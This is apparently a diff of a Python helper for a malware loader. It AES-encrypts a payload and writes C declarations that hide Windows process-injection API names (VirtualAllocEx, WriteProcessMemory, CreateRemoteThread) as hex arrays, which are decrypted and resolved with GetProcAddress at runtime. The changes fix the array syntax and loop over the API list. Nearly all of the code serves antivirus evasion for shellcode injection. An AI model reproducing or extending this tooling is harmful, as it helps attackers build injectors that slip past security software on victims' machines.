@@ -31,20 +31,12 @@ except:
 ciphertext = aesenc(plaintext, KEY)
 
 
-"""
-char key[] = 
-unsigned char calc_payload[] = 
-unsigned int calc_len = sizeof(calc_payload);
-"""
-
-
-
 def obfuser(ApiCallToObfus):
 
     stringApiCallToObfus = "s" + ApiCallToObfus
     pointerApiCallToObfus = "p" + ApiCallToObfus
     
-    unsignedencstring = 'unsigned char '+stringApiCallToObfus+' = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ApiCallToObfus) + ' };'
+    unsignedencstring = 'unsigned char '+stringApiCallToObfus+'[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ApiCallToObfus) + ' };'
     AESdecstring = 'AESDecrypt((char *) '+stringApiCallToObfus+', sizeof('+stringApiCallToObfus+'), key, sizeof(key));	'
     pString = pointerApiCallToObfus+' = GetProcAddress(GetModuleHandle("kernel32.dll"), '+stringApiCallToObfus+');'
     
@@ -57,11 +49,6 @@ def obfuser(ApiCallToObfus):
     #pVirtualAllocEx = GetProcAddress(GetModuleHandle("kernel32.dll"), sVirtualAllocEx);
     
    
-    
-    
-
-
-
 
 
 # Payload section
@@ -77,20 +64,16 @@ sCreateRemoteThread = "CreateRemoteThread"
 sVirtualAlloc = "VirtualAlloc"
 sCreateToolhelp32Snapshot = "CreateToolhelp32Snapshot"
 
-
-
-
-
 #print('unsigned char sWriteProcessMemory[] =  { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in sWriteProcessMemory) + ' };')
 #print('unsigned char sCreateRemoteThread[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in sCreateRemoteThread) + ' };')
 #print('unsigned char sVirtualAlloc[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in sVirtualAlloc) + ' };')
 #print('unsigned char sCreateToolhelp32Snapshot[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in sCreateToolhelp32Snapshot) + ' };')
 
 
+kek = ['VirtualAllocEx','WriteProcessMemory','CreateRemoteThread','VirtualAlloc','CreateToolhelp32Snapshot']
 
 
-
-print("")
-print(obfuser("VirtualAllocEx")[0])
-print(obfuser("VirtualAllocEx")[1])
-print(obfuser("VirtualAllocEx")[2])
+for i in kek:
+    print(i)
+    for i in obfuser(i):
+        print(i) 
